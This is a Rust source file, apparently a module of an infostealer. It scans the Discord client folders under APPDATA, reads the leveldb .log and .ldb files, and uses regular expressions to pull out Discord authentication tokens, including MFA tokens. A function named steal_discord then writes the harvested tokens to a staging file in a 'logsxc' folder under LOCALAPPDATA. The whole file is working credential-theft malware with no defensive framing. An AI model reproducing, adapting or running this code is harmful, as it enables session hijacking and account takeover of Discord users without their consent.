use std::path::{Path, PathBuf};
use std::io::prelude::*;
use std::fs;
use std::env::var;
use regex::Regex;

fn path_exists(path: &String) -> bool {
    Path::new(path).exists()
}


fn get_paths() -> Vec<String> {
    let mut paths = Vec::new();

    let path_appdata = var("APPDATA").unwrap();

    paths.push(path_appdata.clone() + "\\Discord");
    paths.push(path_appdata.clone() + "\\discordcanary");
    paths.push(path_appdata.clone() + "\\discordptb");

    paths
}

fn has_ending(full_string: &str, ending: &str) -> bool {
    let tmp = match Path::new(full_string) .extension().and_then(std::ffi::OsStr::to_str) {
        None => "Error",
        Some(value) => value,
    };

    if tmp == ending {
        return true;
    }
    
    false
}

fn search_token(location: PathBuf) -> String {
    let mut file = std::fs::File::open(location.clone()).expect("Couldn't open file");
    let meta_data = std::fs::metadata(location).expect("Couldn't read metadata");
    let mut buffer = vec![0; meta_data.len() as usize];
    
    file.read(&mut buffer).expect("buffer overflow");

    let content = String::from_utf8_lossy(&buffer);

    let regex_one = Regex::new(r"[\w-]{24}\.[\w-]{6}\.[\w-]*").unwrap();
    let regex_two = Regex::new(r"mfa\.[\w-]*").unwrap();


    let value = regex_one.find(&*content);
    let value_two = regex_two.find(&*content);

    let token: &str = match value {
        None => { 
            let tmp: &str = match value_two {
                None => "No token found",
                Some(value) => value.as_str()
            };
            tmp
        },
        Some(value) => value.as_str(),
    };

    token.to_string()
}

fn get_discord_token(path: &String) -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let target = path.to_owned() + "\\Local Storage\\leveldb";
    let mut token: Vec<String> = Vec::new();
    for entry in fs::read_dir(target)? {
        let entry = entry?;
        let str_path = entry.path();
        
        if has_ending(str_path.to_str().unwrap(), "log") {
            let tmp = search_token(str_path.clone());
            if tmp == "No token found" {
                continue
            }
            token.push(tmp);
        }

        if has_ending(str_path.to_str().unwrap(), "ldb") {
            let tmp = search_token(str_path.clone());
            if tmp == "No token found" {
                continue
            }
            token.push(tmp);
        }
    }

    Ok(token)
}

fn get_tokens() -> Vec<String> {
    let target_location = get_paths();
    let mut token: Vec<String> = Vec::new();

    for (_, e) in target_location.iter().enumerate() {
        if path_exists(e) {
            token = match get_discord_token(e) {
                Ok(token) => token,
                Err(_) => Vec::new(),
            };
        }
    }

    token
}

pub fn steal_discord() {
    let tokens = get_tokens();
    std::fs::File::create(format!("{}\\logsxc\\discord_tokens.txt", std::env::var("LOCALAPPDATA").unwrap())).unwrap().write(tokens.join("\n").as_bytes()).unwrap();
}